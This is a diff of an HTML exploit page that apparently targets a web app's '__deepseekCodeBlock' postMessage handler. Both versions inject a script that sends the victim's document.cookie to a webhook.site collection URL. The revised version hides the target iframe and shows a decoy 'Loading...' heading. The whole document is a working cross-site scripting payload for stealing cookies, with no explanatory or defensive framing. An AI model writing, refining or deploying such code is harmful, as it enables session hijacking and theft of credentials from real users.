@@ -1,17 +1,19 @@
-<iframe 
-    width="600px" 
-    height="600px" 
-    src="http://103.130.211.150:19065/" 
-    id="targetFrame"
-    onload="exploit()">
-</iframe>
-
-<script>
-    function exploit() {
-        document.getElementById("targetFrame").contentWindow.postMessage({
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Loading...</h1>
+    <iframe 
+      src="http://103.130.211.150:19065/" 
+      width="0" height="0" style="display:none" 
+      onload="
+        setTimeout(() => {
+          this.contentWindow.postMessage({ 
             __deepseekCodeBlock: `<script>
-                document.location = 'https://webhook.site/42edc446-fdd6-448c-be3b-b11875dbbada?c=' + document.cookie;
-            </script>`
-        }, '*');
-    }
-</script>
+              fetch('https://webhook.site/42edc446-fdd6-448c-be3b-b11875dbbada?c='+document.cookie, {mode: 'no-cors'});
+            </script>` 
+          }, '*');
+        }, 3000);
+      ">
+    </iframe>
+  </body>
+</html>
